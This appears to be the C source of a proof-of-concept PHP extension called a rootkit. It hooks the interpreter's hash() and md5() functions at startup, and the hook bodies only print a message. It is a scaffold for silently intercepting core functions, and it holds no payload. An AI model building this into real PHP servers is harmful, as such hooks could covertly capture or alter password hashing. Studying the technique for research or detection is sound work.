#include "rootkit_config.h"
#include "rootkit_hook.h"

/*
 * This method is the hook for hash().
 */
PHP_FUNCTION(hook_hash)
{
    // Here it can do whatever once the original hash() is called.
    // Notice that it will be executed BEFORE the original function.
    ROOTKIT_PRINTF("# HASH() hooked!\n");
}

/*
 * This method is the hook method for md5().
 */
PHP_FUNCTION(hook_md5)
{
    // Here it can do whatever once the original md5() is called.
    // Notice that it will be executed BEFORE the original function.
    ROOTKIT_PRINTF("# MD5() hooked!\n");
}

/**
 * Once the module inits, we can define whomes functions we want to hook.
 * For instance 'md5', 'sha1', etc...
 */
PHP_MINIT_FUNCTION(rootkit)
{
    // http://php.net/manual/es/internals2.ze1.zendapi.php#internals2.ze1.zendapi.structure.exporting-functions
    //
    // When we declare a new PHP_FUNCTION Zend Engine will define it with 'zif' prefix as default.
    // So in the hook you must specify this prefix in order to be able to call our own method.
    // Take in mind that the last parameter specifies wheter the original function will be called or not.
    rootkit_hook_function("hash", zif_hook_hash, true);
    rootkit_hook_function("md5", zif_hook_md5, true);

    return SUCCESS;
}

/*
 * This is the info definition
 */
PHP_MINFO_FUNCTION(rootkit)
{
    php_info_print_table_start();
    php_info_print_table_header(2, "Rootkit support", "enabled");
    php_info_print_table_row(2, "PoC version", ROOTKIT_VERSION);
    php_info_print_table_row(2, "Author", ROOTKIT_AUTHOR);
    php_info_print_table_end();
    DISPLAY_INI_ENTRIES();
}

/**
 * Module entry
 * Defines the module itself
 */
zend_module_entry rootkit_module_entry = {
    #if ZEND_MODULE_API_NO >= 20010901
        STANDARD_MODULE_HEADER,
    #endif
        ROOTKIT_NAME,                       // Module name
        NULL,                               // All exposed functions, only to test POC, will get removed later
        PHP_MINIT(rootkit),                 // On module startup
        NULL,                               // On module shutdown
        NULL,                               // On request start
        NULL,                               // On request end
        PHP_MINFO(rootkit),                 // Module info (will be showed in phpinfo)
    #if ZEND_MODULE_API_NO >= 20010901
        ROOTKIT_VERSION,
    #endif
        STANDARD_MODULE_PROPERTIES
};

/**
 * ZEND_GET_MODULE
 * Declaration of the module itself.
 */
ZEND_GET_MODULE(rootkit)